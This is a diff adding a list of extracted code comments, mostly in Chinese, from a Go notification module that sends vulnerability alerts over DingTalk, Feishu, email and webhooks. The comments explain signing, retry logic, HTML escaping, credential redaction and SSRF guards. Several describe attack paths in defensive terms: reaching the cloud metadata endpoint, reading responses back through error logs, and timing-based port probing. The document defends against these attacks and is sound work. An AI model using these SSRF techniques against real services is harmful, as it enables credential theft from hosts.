@@ -1,0 +1,948 @@
+0 source/enrich/enrich.go:2 // in docs/资产模型与自动关联设计.md §5: an async worker pool that resolves domains
+1 source/notify/channels_test.go:17 // singleMsg 构造一条带引号与换行的单发消息。刻意用含 `"` 与 `\n` 的标题/摘要：
+2 source/notify/channels_test.go:18 // 这正是模板插值最容易产出的非法 JSON 的输入。
+3 source/notify/channels_test.go:33 // batchMsg 构造一批汇总消息。
+4 source/notify/channels_test.go:49 // capturePost 起一个假接收端，把收到的请求体与头回传给断言函数。
+5 source/notify/channels_test.go:100 // TestDingTalkBusinessErrorIsPermanent 锁住「HTTP 200 但 errcode 非 0」的判定。
+6 source/notify/channels_test.go:101 // 不检查 errcode 会把投递失败记成成功——这是各家国内 IM 平台共有的坑。
+7 source/notify/channels_test.go:126 // 造一批足够长的中文汇总，必然超过 4096 字节。
+8 source/notify/channels_test.go:164 // 配了 secret 就必须带加签参数，否则飞书会以 19021 拒收。
+9 source/notify/channels_test.go:168 // 卡片元素里应包含一个按钮，其 url 指向漏洞详情。
+10 source/notify/channels_test.go:215 // 标题与摘要来自被测目标/模型输出，是不可信内容。
+11 source/notify/channels_test.go:251 // 这条是默认模板存在的意义：标题里带引号与换行时，任何朴素的
+12 source/notify/channels_test.go:252 // `"title": "{{.Title}}"` 写法都会产出非法 JSON。{{json .}} 才不会。
+13 source/notify/channels_test.go:265 // 数值必须是 JSON 数字而不是字符串（json:"...,string" 之类的写法会踩这坑）。
+14 source/notify/channels_test.go:330 // 中文主题必须 RFC 2047 编码，否则客户端显示成乱码。
+15 source/notify/channels_test.go:340 // 正文是 base64，解出来应是合法 HTML。
+16 source/notify/channels_test.go:353 // 标题原样出现在文本位置：HTML 文本内容里的双引号是合法字符，无需转义。
+17 source/notify/channels_test.go:354 // 这里断言「原样保留」是为了防止将来有人误加一层引号转义，让中文引号
+18 source/notify/channels_test.go:355 // 显示成 &quot;。
+19 source/notify/channels_test.go:361 // TestEmailEscapesStructuralInjection 覆盖邮件正文真正需要防的注入：
+20 source/notify/channels_test.go:362 // 漏洞标题与摘要来自被测目标与模型输出，是不可信内容。文本位置必须转义
+21 source/notify/channels_test.go:363 // & < >（否则可以注入标签），属性位置还必须转义引号（否则可以闭合 href）。
+22 source/notify/channels_test.go:383 // 回链是管理员可配的 public_base_url，本身可信度较高，但属性位置仍必须
+23 source/notify/channels_test.go:384 // 转义引号——否则一个带引号的地址会闭合 href 并注入事件处理器。
+24 source/notify/channels_test.go:405 // 校验错误会直接展示给配置者，必须说清楚缺什么，而不是泛泛的「配置无效」。
+25 source/notify/channels_test.go:436 // TestEmailSMTPErrorClassification 锁住 SMTP 4xx/5xx 的语义区分。
+26 source/notify/channels_test.go:437 // 若把 4xx 也判成永久失败，一个启用灰名单的邮件服务器会让每条推送都在第一次
+27 source/notify/channels_test.go:438 // 尝试后落入 failed —— 而灰名单恰恰是自动重试最该发挥作用的场景。
+28 source/notify/channels_test.go:450 // 取不到应答码时按「可重试」处理：宁可多试一次，也不要把可能的瞬时
+29 source/notify/channels_test.go:451 // 故障判死。
+30 source/notify/channels_test.go:460 // 无论怎么分类，原文都要保留给使用者排查。
+31 source/notify/channels_test.go:468 // 六个渠道缺一不可——少一个会在 UI 下拉里静默消失。
+32 source/notify/dingtalk.go:17 // dingTalkChannel 实现钉钉自定义机器人。
+33 source/notify/dingtalk.go:19 // 平台特性（决定了这里的实现取舍）：
+34 source/notify/dingtalk.go:20 //   - 单机器人限流 20 条/分钟，超发会被静默丢弃（HTTP 仍可能 200），
+35 source/notify/dingtalk.go:21 //     所以限流必须在客户端做，见 DefaultRatePerMin。
+36 source/notify/dingtalk.go:22 //   - 安全设置三选一：加签 / 自定义关键词 / IP 白名单。加签是唯一不依赖
+37 source/notify/dingtalk.go:23 //     消息内容的方案，所以只支持加签（也支持三者都不开的裸 webhook）。
+38 source/notify/dingtalk.go:24 //   - 成功/失败都返回 HTTP 200，靠 body 里的 errcode 区分——不检查 errcode
+39 source/notify/dingtalk.go:25 //     会把投递失败记成成功。
+40 source/notify/dingtalk.go:32 // 钉钉的 Webhook 地址里带 access_token，本身就是凭据，因此整体掩码。
+41 source/notify/dingtalk.go:35 // 目标是钉钉的 Webhook 地址本身；改地址必须同时对新地址重新表态加签密钥。
+42 source/notify/dingtalk.go:49 // Send 投递一次消息。有回链且是单条时用 ActionCard（带按钮），否则用 markdown。
+43 source/notify/dingtalk.go:61 // 钉钉 markdown 正文无明确字节上限，但仍做上限保护，避免证据字段异常膨胀。
+44 source/notify/dingtalk.go:87 // 钉钉把业务错误藏在 200 响应里。
+45 source/notify/dingtalk.go:96 // 301000 是签名校验失败、310000 是关键词不匹配——都是配置错误，
+46 source/notify/dingtalk.go:97 // 重试不会自愈。
+47 source/notify/dingtalk.go:103 // dingTalkSignedURL 按官方加签规则给 webhook 追加 timestamp 与 sign 参数。
+48 source/notify/dingtalk.go:105 // 规则：待签串 = timestamp + "\n" + secret，HMAC-SHA256 的**密钥也是 secret**，
+49 source/notify/dingtalk.go:106 // 结果 base64 后 URL 编码。timestamp 是毫秒。secret 为空时原样返回，
+50 source/notify/dingtalk.go:107 // 以支持未开启加签的机器人。
+51 source/notify/dingtalk.go:119 // 不透传 err：url.Parse 的错误文本里带完整地址（含 access_token）。
+52 source/notify/dingtalk.go:129 // validateHTTPURL 校验地址可用、协议受支持，并对字面 IP 目标做内网判断。
+53 source/notify/dingtalk.go:131 // 两点讲究：
+54 source/notify/dingtalk.go:133 //  1. **错误信息必须脱敏**。url.Parse 自己返回的是 *url.Error，它的 Error() 带
+55 source/notify/dingtalk.go:134 //     **完整原始地址**，而本功能这几家的地址里就嵌着凭据（钉钉 access_token、
+56 source/notify/dingtalk.go:135 //     企微 key、Telegram 的 bot token、飞书 hook id）。曾经这里直接 `return err`，
+57 source/notify/dingtalk.go:136 //     于是「地址格式非法」这条错误就把凭据带了出去，流向测试接口的 400 响应、
+58 source/notify/dingtalk.go:137 //     每次投递落库的 last_error、服务端日志与投递历史接口。
+59 source/notify/dingtalk.go:139 //  2. **字面 IP 直接判内网**，域名留给拨号阶段判（blockInternalDial 才是最终
+60 source/notify/dingtalk.go:140 //     生效点，也能覆盖 DNS 重绑定）。这里做一次是为了让保存配置时就能得到提示，
+61 source/notify/dingtalk.go:141 //     而不是等到第一次投递失败。
+62 source/notify/dingtalk.go:143 // 限制协议是防御性的：file:///gopher:// 之类会让 http.Client 产生意料之外的
+63 source/notify/dingtalk.go:144 // 行为（虽已被 scheme 检查挡下，但没有理由放开这个面）。
+64 source/notify/email.go:17 // emailDialTimeout / emailSessionTimeout 分别约束建连与整段 SMTP 会话。
+65 source/notify/email.go:18 // net/smtp 自身没有任何超时机制，不设这两道的话，一个卡住的对端会让
+66 source/notify/email.go:19 // 投递 goroutine 永久挂在那里——而 dispatcher 是单 goroutine 串行处理的，
+67 source/notify/email.go:20 // 等于整个通知系统停摆。
+68 source/notify/email.go:26 // emailChannel 实现 SMTP 邮件投递。
+69 source/notify/email.go:31 // 邮件没有平台限流，但不该用它刷屏；给一个宽松的默认值。
+70 source/notify/email.go:34 // 只掩码密码。SMTP 主机、账号、收件人都不算秘密，掩码它们只会让编辑变麻烦。
+71 source/notify/email.go:37 // host/port 决定把密码交给哪台服务器；tls 决定是否加密传输。三者任一变化都
+72 source/notify/email.go:38 // 要求重新表态密码——顺带让「关掉 TLS」这一步必须显式带上凭据，而不是顺手一改。
+73 source/notify/email.go:82 // STARTTLS：对端支持就升级。明文会话下不能发凭据（见下面的 auth 说明）。
+74 source/notify/email.go:92 // smtp.PlainAuth 会拒绝在未加密连接上发送凭据（除非目标是 localhost）。
+75 source/notify/email.go:93 // 这是**正确**的安全行为，不能绕过，但需要把原因翻译清楚——
+76 source/notify/email.go:94 // 否则使用者只会看到「unencrypted connection」而不知道该怎么办。
+77 source/notify/email.go:119 // Quit 失败不影响「邮件已被服务器接收」这个事实，因此忽略其错误。
+78 source/notify/email.go:121 // 邮件没有长度截断（HTML 正文全部发送），整批都算送达。
+79 source/notify/email.go:125 // emailDial 建立 SMTP 连接。
+80 source/notify/email.go:127 // implicitTLS=true 走 465 这类「连上即 TLS」的方式；false 走 25/587 明文建连后再
+81 source/notify/email.go:128 // STARTTLS。两者不能混：对 465 端口发明文 greeting 会被直接断开。
+82 source/notify/email.go:130 // 会话期限在**建连处**就设好（而非事后补设），因为 net/smtp 的 Client 把底层
+83 source/notify/email.go:131 // 连接藏在未导出字段里，外部拿不到它；连接一旦交出去就只能靠预先设置的 deadline
+84 source/notify/email.go:132 // 兜底。这也顺带覆盖了握手阶段的阻塞。
+85 source/notify/email.go:133 // Control 挂 blockInternalDial 与 HTTP 系渠道共用同一道守卫。不挂的话 SMTP
+86 source/notify/email.go:134 // 就是整套 SSRF 防护的缺口：host 填 169.254.169.254 或 127.0.0.1 能直接连上，
+87 source/notify/email.go:135 // 而 smtp.NewClient 握手失败时会把对端返回的那一行包进错误、经 last_error
+88 source/notify/email.go:136 // 由投递历史接口回显，构成半盲读原语；「连接被拒 vs 超时」的耗时差异还能
+89 source/notify/email.go:137 // 用来探测端口。拨号阶段是最终生效点，也覆盖 DNS 重绑定。
+90 source/notify/email.go:159 // smtpStageError 按 SMTP 应答码把某个阶段的失败分成「可重试」与「永久失败」。
+91 source/notify/email.go:161 // 为什么必须区分：SMTP 的 4xx 与 5xx 语义完全不同——
+92 source/notify/email.go:162 //   - 4xx（450 灰名单、451 本地错误、452 存储不足）是**临时**拒绝，
+93 source/notify/email.go:163 //     正规做法是稍后重试；尤其是灰名单，几乎每次首次投递都会遇到。
+94 source/notify/email.go:164 //   - 5xx（550 用户不存在、553 地址非法）是永久拒绝，重试没有意义。
+95 source/notify/email.go:166 // 若一律判永久失败，一个启用灰名单的邮件服务器会让**每一条**推送都在第一次
+96 source/notify/email.go:167 // 尝试后落入 failed——而这类失败恰恰是自动重试最该发挥作用的场景。
+97 source/notify/email.go:168 // 应答码取错误文本的前三位数字；取不到码时按可重试处理（宁可多试一次，
+98 source/notify/email.go:169 // 也不要因为解析不出就把可能的瞬时故障判死）。
+99 source/notify/email.go:178 // smtpReplyCode 从 SMTP 错误文本里取前导的三位应答码，取不到返回 0。
+100 source/notify/email.go:179 // net/smtp 不导出错误码字段，只能从文本里取；格式为「450 4.7.1 ...」。
+101 source/notify/email.go:191 // buildEmailMessage 组装完整的 RFC 5322 邮件。
+102 source/notify/email.go:193 // 正文用 base64 编码有两个原因：一是 SMTP 规定单行不超过 1000 字节，而 HTML
+103 source/notify/email.go:194 // 正文（尤其汇总邮件）很容易出现超长行；二是 base64 天然不会出现以 "." 开头
+104 source/notify/email.go:195 // 的行，省去 SMTP 点号转义的麻烦。
+105 source/notify/email.go:200 // 中文主题必须做 RFC 2047 编码，否则会被客户端显示成乱码。
+106 source/notify/email.go:205 // 邮件没有长度硬上限，因此不截断正文。
+107 source/notify/email.go:208 // base64 按 76 字符折行，符合 RFC 2045。
+108 source/notify/email_test.go:13 // 本文件补齐邮件渠道的协议级测试。在此之前 email.Send 的覆盖率是 0——
+109 source/notify/email_test.go:14 // 整条 SMTP 路径没有任何用例跑过，而它恰恰是六个渠道里协议面最大、
+110 source/notify/email_test.go:15 // 最容易出错的一个（握手、认证、信封、DATA 阶段各有各的失败语义）。
+111 source/notify/email_test.go:17 // 这里用自建的最小 SMTP 服务器驱动，而不是 mock 掉 net/smtp：
+112 source/notify/email_test.go:18 // 邮件渠道的绝大部分风险就在「与真实 SMTP 服务器对话」这一步，
+113 source/notify/email_test.go:19 // 把这一步 mock 掉等于不测。
+114 source/notify/email_test.go:21 // fakeSMTP 是一个刚好够用的 SMTP 服务器：能完成 greet/EHLO/AUTH/MAIL/RCPT/DATA/QUIT，
+115 source/notify/email_test.go:22 // 并按用例要求对特定阶段返回指定应答码。
+116 source/notify/email_test.go:26 // rcptReply 是 RCPT TO 的应答；默认 250。
+117 source/notify/email_test.go:28 // mailReply 是 MAIL FROM 的应答；默认 250。
+118 source/notify/email_test.go:30 // advertiseAuth 为 true 时在 EHLO 里声明支持 AUTH PLAIN。
+119 source/notify/email_test.go:100 // 不声明 STARTTLS：让代码走明文分支（测试目标是信封逻辑，不是 TLS）。
+120 source/notify/email_test.go:107 // 简化处理：PLAIN 的初始应答可能跨多行，直接接受。
+121 source/notify/email_test.go:162 // 信封阶段必须走到：发件人、两个收件人、DATA。
+122 source/notify/email_test.go:168 // 正文是 base64 的 HTML，且要带上真实的漏洞内容（编码后仍可辨认）。
+123 source/notify/email_test.go:179 // 多个收件人都要出现在 To 头里。
+124 source/notify/email_test.go:186 // 未配账号时不应发 AUTH —— 有些中继会因此拒收。
+125 source/notify/email_test.go:197 // TestEmailSendClassifiesSMTPReplies 是本次审计修复的直接验证：
+126 source/notify/email_test.go:198 // 5xx 判永久失败、4xx（灰名单）判可重试。
+127 source/notify/email_test.go:224 // 服务器原文要保留，否则用户不知道该找服务器管理员还是改地址。
+128 source/notify/email_test.go:233 // net/smtp 的 PlainAuth 拒绝在未加密连接上发凭据（除非目标是 localhost）。
+129 source/notify/email_test.go:234 // 这是**正确**的安全行为，不能被绕过；但要给出能指导用户修复的错误。
+130 source/notify/email_test.go:235 // 这里用一个非 localhost 的主机名触发它。
+131 source/notify/email_test.go:240 // 非 localhost
+132 source/notify/email_test.go:251 // 连不上 或 被拒发凭据都算通过这条断言；关键是**不能**静默把密码发出去。
+133 source/notify/email_test.go:258 // 邮件渠道的配置字段最多，遗漏任一个都会在投递时才暴露；这里逐个确认
+134 source/notify/email_test.go:259 // 校验能提前拦下。断言检查的是「错误信息提到了缺什么」。
+135 source/notify/email_test.go:279 // TestEmailConfigTolerance 覆盖配置读取的容错：JSONB 里数值是 float64，
+136 source/notify/email_test.go:280 // 但用户在 UI 里可能把端口填成字符串；数组也可能是单个字符串。
+137 source/notify/email_test.go:284 // 字符串形式的端口
+138 source/notify/email_test.go:286 // 单个字符串而非数组
+139 source/notify/email_test.go:287 // 字符串形式的布尔
+140 source/notify/email_test.go:303 // TestFilterValidateRejectsTypo 是审计修复的直接验证：
+141 source/notify/email_test.go:304 // 门槛打错字必须在写入时被拦，否则过滤器会静默失效变成全推。
+142 source/notify/email_test.go:312 // 这些是真实会发生的笔误——全部必须被拒。
+143 source/notify/email_test.go:319 // 错误信息要能指导用户改对。
+144 source/notify/email_test.go:326 // TestFilterValidateIsWriteTimeOnly 锁住「写入严、读取宽」的分工：
+145 source/notify/email_test.go:327 // 库里已有的坏值不能让渠道整个读不出来（那会让历史渠道突然全部停止推送）。
+146 source/notify/email_test.go:330 // 不报错
+147 source/notify/email_test.go:334 // 且该渠道仍能对事件做出判定（不 panic、不阻塞）。
+148 source/notify/feishu.go:15 // feishuChannel 实现飞书（含 Lark）自定义机器人，走交互式卡片。
+149 source/notify/feishu.go:17 // 平台特性：
+150 source/notify/feishu.go:18 //   - 加签算法与钉钉**不同**，且极易写错，见 feishuSign 注释。
+151 source/notify/feishu.go:19 //   - 与钉钉一样把业务错误塞在 HTTP 200 的 body 里（code != 0）。
+152 source/notify/feishu.go:20 //   - 卡片 header 支持颜色模板，用级别映射配色，让人在消息列表里一眼看出严重程度。
+153 source/notify/feishu.go:25 // 飞书自定义机器人约 5 次/秒，折合 100 次/分钟。
+154 source/notify/feishu.go:28 // Webhook 地址末段即机器人唯一标识，属凭据。
+155 source/notify/feishu.go:31 // 同理：改 Webhook 地址必须对新地址重新表态签名密钥。
+156 source/notify/feishu.go:54 // 加签参数与消息同层，且只在配置了 secret 时出现。
+157 source/notify/feishu.go:67 // 部分版本的飞书 hook 用这套字段名，一并兼容。
+158 source/notify/feishu.go:83 // feishuSign 按飞书官方规则计算签名。
+159 source/notify/feishu.go:85 // 这里特别容易踩坑：官方样例是
+160 source/notify/feishu.go:89 // 也就是 **key = timestamp + "\n" + secret，message 为空**，而不是直觉上的
+161 source/notify/feishu.go:90 // 「key=secret, message=stringToSign」——那正是钉钉的算法。两边算法刚好反过来，
+162 source/notify/feishu.go:91 // 照着另一家的实现写必然签名校验失败（报 19021）。
+163 source/notify/feishu.go:98 // feishuSeverityTemplate 把漏洞级别映射到卡片 header 配色模板。
+164 source/notify/feishu.go:99 // 未知级别用 grey——不用 blue，免得和 low 混淆。
+165 source/notify/feishu.go:115 // feishuMaxCardBytes 是卡片内容的保守上限。飞书对卡片有体积限制，超了整条被拒；
+166 source/notify/feishu.go:116 // 取一个明显低于官方上限的值，把 JSON 包装开销也算进来。
+167 source/notify/feishu.go:119 // feishuCard 构造交互式卡片，返回卡片与**实际写入的条目数**。
+168 source/notify/feishu.go:120 // kept 的用途同 markdownBody：只有真正进了卡片的条目才该被标记为已送达。
+169 source/notify/feishu.go:125 // 先按整条打包再拼头部：头部要写「其余 N 条将在下一条消息继续」，
+170 source/notify/feishu.go:126 // N 必须来自实际装下的条数。
+171 source/notify/feishu.go:174 // feishuItemLines 渲染单个漏洞的 lark_md 正文。
+172 source/notify/feishu.go:176 // lark_md 与 markdown 是同族的文本格式，同样会解析链接与强调，所以来自外部
+173 source/notify/feishu.go:177 // 的字段一律过 markdownText（单行化 + 转义）——否则一条漏洞标题就能在
+174 source/notify/feishu.go:178 // 飞书里变成可点击的外链。
+175 source/notify/feishu.go:199 // feishuBatchLine 渲染汇总卡片里的一条。
+176 source/notify/filter.go:10 // Filter 是 notification_channels.filter 这一 JSONB 列的契约：渠道实例的过滤条件。
+177 source/notify/filter.go:11 // 所有字段都可选，缺省即「不过滤」——这正是畸形配置的兜底语义，见 ParseFilter。
+178 source/notify/filter.go:13 // MinSeverity 是最低级别门槛（low/medium/high/critical），空=不设门槛。
+179 source/notify/filter.go:15 // TaskIDs / AssetIDs 为空数组表示不限；非空则要求事件与它有交集。
+180 source/notify/filter.go:18 // VulnClassInclude 为空表示全收；非空则要求 vulnclass 命中其中任一关键词。
+181 source/notify/filter.go:19 // VulnClassExclude 命中任一关键词即排除（排除优先于包含）。
+182 source/notify/filter.go:20 // 匹配方式为大小写不敏感的子串——比正则安全：用户配错正则不会让渠道静默失效。
+183 source/notify/filter.go:23 // OnStatusChange 决定该渠道是否接收漏洞状态变更事件（仅 realtime 模式有意义）。
+184 source/notify/filter.go:27 // ParseFilter 解析渠道过滤配置。
+185 source/notify/filter.go:29 // **永不返回 error。** 这是刻意的设计选择：过滤条件配置畸形时一律退化为零值
+186 source/notify/filter.go:30 // Filter（= 不过滤 = 全部命中），因为对一个漏洞通知系统来说，**多推一条远好过
+187 source/notify/filter.go:31 // 静默漏掉一条高危**。让解析失败变成「不推送」，等于给用户一个看起来配好了、
+188 source/notify/filter.go:32 // 实际什么都不推的渠道——这是最糟的失败模式。
+189 source/notify/filter.go:38 // 解析失败时 f 保持零值，即不过滤。
+190 source/notify/filter.go:43 // ValidMinSeverity 报告 s 是否为合法的级别门槛（空串表示不设门槛）。
+191 source/notify/filter.go:52 // Validate 校验过滤配置里**取值受限**的字段，供保存渠道时调用。
+192 source/notify/filter.go:54 // 为什么必须在写入时拦：Match 对未知门槛的判定是 `rank >= 0`，恒为真——
+193 source/notify/filter.go:55 // 也就是说 min_severity 打错一个字（"hgih"），过滤器会**静默失效**变成
+194 source/notify/filter.go:56 // 「全推」。这与本包「宁可多推不可漏推」的取舍方向一致（不会漏），
+195 source/notify/filter.go:57 // 但后果是用户以为自己在做分级推送、实际把全部漏洞灌进群里，
+196 source/notify/filter.go:58 // 而且没有任何迹象提示他配错了。这类「静默降级」正应该在入口处拦掉。
+197 source/notify/filter.go:60 // 注意 Validate 只用于**写入**路径。读取路径仍走 ParseFilter 的宽容语义，
+198 source/notify/filter.go:61 // 这样历史数据里已经存在的坏值不会让渠道整个读不出来。
+199 source/notify/filter.go:69 // Match 判定一个事件是否应投递到带有该过滤条件的渠道。
+200 source/notify/filter.go:71 // **永不返回 error**，理由同 ParseFilter：任何内部异常都按「命中」处理。
+201 source/notify/filter.go:72 // 判定顺序：事件类型 → 级别门槛 → 任务/资产范围 → 漏洞类型关键词。
+202 source/notify/filter.go:74 // 状态变更事件只有显式开启的渠道才接收。默认关，因为绝大多数使用者
+203 source/notify/filter.go:75 // 期望「推送」指的是「发现新漏洞」，而不是流水账式地跟进每个状态流转。
+204 source/notify/filter.go:88 // 排除优先：命中任一排除关键词即出局，即便同时命中了包含列表。
+205 source/notify/filter.go:99 // 小集合线性扫描即可；两边的量级都是「人手勾选的几十个」，
+206 source/notify/filter.go:100 // 建 map 的开销大于收益。
+207 source/notify/filter.go:109 // containsAnyFold 报告 s 是否包含 keywords 中任一关键词（大小写不敏感）。
+208 source/notify/filter_test.go:6 // 畸形 JSON、空输入、类型不对的字段——全部必须退化为零值 Filter，
+209 source/notify/filter_test.go:7 // 即「不过滤」。这条不变量是「宁可多推不可漏推」的落点：
+210 source/notify/filter_test.go:8 // 一旦这里改成报错或半解析，用户配错一个字符就会静默丢掉所有高危通知。
+211 source/notify/filter_test.go:25 // 零值 Filter 必须命中任意事件。
+212 source/notify/filter_test.go:51 // 未知级别序数为 0，应被任何非空门槛挡住（存疑时不推）。
+213 source/notify/filter_test.go:112 // 排除优先于包含：同时命中时应当出局。
+214 source/notify/filter_test.go:117 // 纯空白关键词应被忽略，否则会退化成「匹配所有含空格的字符串」。
+215 source/notify/filter_test.go:131 // 默认关：绝大多数人说的「推送漏洞」指发现新漏洞，不是状态流水账。
+216 source/notify/filter_test.go:138 // 创建事件不受 on_status_change 影响。
+217 source/notify/html.go:8 // 本文件渲染邮件的 HTML 正文。刻意用内联样式 + 简单表格布局而不是现代 CSS：
+218 source/notify/html.go:9 // 邮件客户端（尤其 Outlook 与国内企业邮箱）对 <style> 块和 flex/grid 的支持
+219 source/notify/html.go:10 // 差异极大，内联样式是唯一在各家都能正确显示的写法。
+220 source/notify/html.go:12 // htmlSeverityColor 返回级别对应的强调色，用于左侧色条与标题。
+221 source/notify/html.go:28 // htmlTitle 返回邮件主题。
+222 source/notify/html.go:33 // htmlBody 渲染邮件正文 HTML。maxRunes<=0 表示不截断。
+223 source/notify/html.go:52 // htmlBatchIntro 渲染汇总邮件开头：条数与级别分布。
+224 source/notify/html.go:77 // htmlItem 渲染单个漏洞。full=true 时含摘要与回链（单条推送），
+225 source/notify/html.go:78 // false 时压缩成一行（汇总列表）。
+226 source/notify/html.go:125 // htmlEscape 转义 HTML 文本内容。漏洞标题与摘要来自被测目标与模型输出，
+227 source/notify/html.go:126 // 是不可信内容——不转义就等于允许把任意 HTML（含外链图片）注入到邮件里。
+228 source/notify/html.go:134 // htmlEscapeAttr 转义 HTML 属性值（在文本转义之外额外处理引号，
+229 source/notify/html.go:135 // 防止 URL 里的引号提前闭合 href 属性）。
+230 source/notify/http.go:19 // allowLocalTargets 决定是否允许把消息投递到环回 / 链路本地地址。
+231 source/notify/http.go:21 // 默认拒绝。这几段地址不是 IM 机器人或公网邮件服务器会出现的地方，而它们能
+232 source/notify/http.go:22 // 打到的东西很敏感：同机另一个服务的管理端口、以及云环境的元数据端点
+233 source/notify/http.go:23 // （169.254.169.254，可读出实例凭据）。投递地址是管理员配的，但一个被 XSS/CSRF
+234 source/notify/http.go:24 // 借用的管理会话、或共用同一 JWT 的第二个人，都能靠改配置把响应内容读回来
+235 source/notify/http.go:25 // ——doJSON 会把 4xx/5xx 的响应体前 200 字节写进 last_error，而投递历史接口
+236 source/notify/http.go:26 // 会把它回显出来，这就是一条半盲读原语。
+237 source/notify/http.go:28 // 但「本机 SMTP 中继」（127.0.0.1:25 上的 postfix）是自建邮件的常见配置，
+238 source/notify/http.go:29 // 一刀切会把人卡住。所以留一个显式逃生口而不是硬编码放行：
+239 source/notify/http.go:30 // 设置 ARTEX_NOTIFY_ALLOW_LOCAL=1 即允许。
+240 source/notify/http.go:32 // 导出为 AllowLocalTargetsEnv 是为了让测试能明确地打开它——本包与 server 包的
+241 source/notify/http.go:33 // 用例大量使用 127.0.0.1 上的 httptest 假接收端，不打开就全部被守卫拦下。
+242 source/notify/http.go:41 // isBlockedDialIP 报告目标 IP 是否属于「默认不允许投递」的地址段。
+243 source/notify/http.go:43 // 只拒绝环回、链路本地（含云元数据 169.254.169.254）、未指定与组播。
+244 source/notify/http.go:44 // **不拒绝** RFC1918 私网：内网自建 Mattermost / SMTP 中继是很常见的合法用法，
+245 source/notify/http.go:45 // 把它们一并挡掉会让功能在真实环境里直接不可用。这条取舍是刻意的——
+246 source/notify/http.go:46 // 防护要挡住真正敏感的目标，同时不能把正常部署一起废掉。
+247 source/notify/http.go:51 // IPv4-mapped IPv6（::ffff:127.0.0.1）要还原成 IPv4 再判，否则绕过检查。
+248 source/notify/http.go:59 // blockInternalDial 是 http.Transport 拨号器的 Control 钩子，在**连接建立时**
+249 source/notify/http.go:60 // 检查目标地址。
+250 source/notify/http.go:62 // 为什么设在拨号阶段而不是只在保存配置时校验：这里才是最终生效点。
+251 source/notify/http.go:63 // 它同时覆盖两种绕过配置校验的情形——DNS 重绑定（校验时解析到公网 IP、
+252 source/notify/http.go:64 // 真正连接时解析到内网）与重定向（虽然我们已拒绝跨主机跳转，但同主机跳转
+253 source/notify/http.go:65 // 仍可能把路径指到别处）。
+254 source/notify/http.go:84 // notifyTransport 在默认 Transport 的基础上只加一个拨号守卫。
+255 source/notify/http.go:85 // 用 Clone 保留默认的全部调优（连接池、HTTP/2、超时、proxy 等），
+256 source/notify/http.go:86 // 避免为了加一个检查而改动其它行为。
+257 source/notify/http.go:97 // httpClient 是所有渠道投递共用的客户端。
+258 source/notify/http.go:99 // 刻意**不**复用项目的全局出口代理（server 侧的 GlobalProxy）：那个代理是给渗透
+259 source/notify/http.go:100 // 目标流量用的，常是不稳定的隧道，而通知的可用性不该被目标网络的抖动绑架。
+260 source/notify/http.go:101 // IM 推送直连即可。超时设为 15 秒——比这更慢的对端实际上已经是故障状态。
+261 source/notify/http.go:103 // 拒绝跨主机重定向：本功能的投递地址都是「一个固定 endpoint」形态，正常不会
+262 source/notify/http.go:104 // 重定向到别的主机；而这几家的凭据（钉钉的 access_token、企微的 key、Telegram 的
+263 source/notify/http.go:105 // bot token）**就在 URL 里**，跟随跨主机跳转等于把凭据交给重定向目标。同主机
+264 source/notify/http.go:106 // 的跳转（如末尾补斜杠）仍允许。
+265 source/notify/http.go:121 // respBodyLimit 限制读取响应体的大小。对端异常时可能吐回超大内容，而我们只需要
+266 source/notify/http.go:122 // 错误码和一小段错误描述用于展示在投递历史里。
+267 source/notify/http.go:125 // doJSON 发送一次请求并返回响应体（已限长）。
+268 source/notify/http.go:127 // payload 为 nil 时发送空 body（用于 GET 或平台不要求 body 的场景）。
+269 source/notify/http.go:128 // headers 里的键值原样附加，用于通用 Webhook 的自定义头。
+270 source/notify/http.go:130 // 错误分类是这个函数的核心职责：网络层失败与 5xx/408/429 归为「可重试」，
+271 source/notify/http.go:131 // 其余 4xx 归为「永久失败」——重试一个 403 只是把同一个错误刷 3 遍日志。
+272 source/notify/http.go:137 // 序列化失败是本地 bug（配置字段类型不对），重试也不会变好。
+273 source/notify/http.go:144 // URL 非法——多半是用户把地址填错了，属于永久失败。
+274 source/notify/http.go:145 // 这里同样不能透传 err：url.Parse 的错误文本里含完整地址。
+275 source/notify/http.go:156 // 连接被拒、DNS 失败、超时——多为瞬时故障，交给退避重试。
+276 source/notify/http.go:158 // 错误文本必须脱敏后再往外传。原因：http.Client.Do 返回的是 *url.Error，
+277 source/notify/http.go:159 // 它的 Error() 是 `Op "完整URL": 底层错误`，而本功能这几家的凭据**就在 URL 里**
+278 source/notify/http.go:160 // （钉钉 access_token、企微 key、飞书 hook id、Telegram /bot<token>/）。
+279 source/notify/http.go:161 // 不脱敏的话，凭据会顺着这条错误串流到四个地方：notification_deliveries
+280 source/notify/http.go:162 // 的 last_error（明文落库）、投递历史接口的响应（**绕过渠道配置的掩码**）、
+281 source/notify/http.go:163 // 服务端日志、以及测试发送接口回给前端的 502 文本。
+282 source/notify/http.go:174 // 429（限流）与 408（超时）值得重试；其余 4xx 是配置或权限问题，重试无意义。
+283 source/notify/http.go:184 // snippet 把响应体压成一行短文本，用于错误信息。响应里可能带换行与大量空白，
+284 source/notify/http.go:185 // 直接塞进 last_error 会让投递历史页面排版崩掉。
+285 source/notify/http.go:190 // redactRequestTarget 把投递地址压成「scheme://host/…」，用于错误信息。
+286 source/notify/http.go:192 // 这是本包唯一的地址脱敏口径，刻意做得**足够粗暴**：除了 scheme 与 host，
+287 source/notify/http.go:193 // 其余一律丢弃。原因是没有一个「通用且安全」的方式判断 URL 的哪一段是凭据：
+288 source/notify/http.go:195 //	钉钉   凭据在 query      /robot/send?access_token=xxx
+289 source/notify/http.go:196 //	企微   凭据在 query      /cgi-bin/webhook/send?key=xxx
+290 source/notify/http.go:197 //	飞书   凭据在**路径末段** /open-apis/bot/v2/hook/<hook_id>
+291 source/notify/http.go:198 //	Telegram 凭据在**路径中段** /bot<token>/sendMessage
+292 source/notify/http.go:200 // 想「只保留有用部分」就得按渠道打补丁，而漏掉任何一家就是一次凭据泄露。
+293 source/notify/http.go:201 // 保留 host 已经够用于排查（DNS 解析不了、连不上、证书不对都能定位），
+294 source/notify/http.go:202 // 具体是哪个机器人由渠道配置里的掩码尾号提示去认。
+295 source/notify/http.go:204 // 解析失败时返回固定占位符——绝不把原始串回显出去。
+296 source/notify/http.go:213 // redactTransportError 从传输层错误里剥掉地址，只保留底层原因。
+297 source/notify/http.go:215 // *url.Error 的结构是 {Op, URL, Err}，Error() 会把 URL 一起打出来。
+298 source/notify/http.go:216 // 这里显式取 Err 字段，绕开它的 Error() ——比事后做字符串替换更可靠，
+299 source/notify/http.go:217 // 因为替换要正确应对 URL 编码/转义后的各种变体，容易漏。
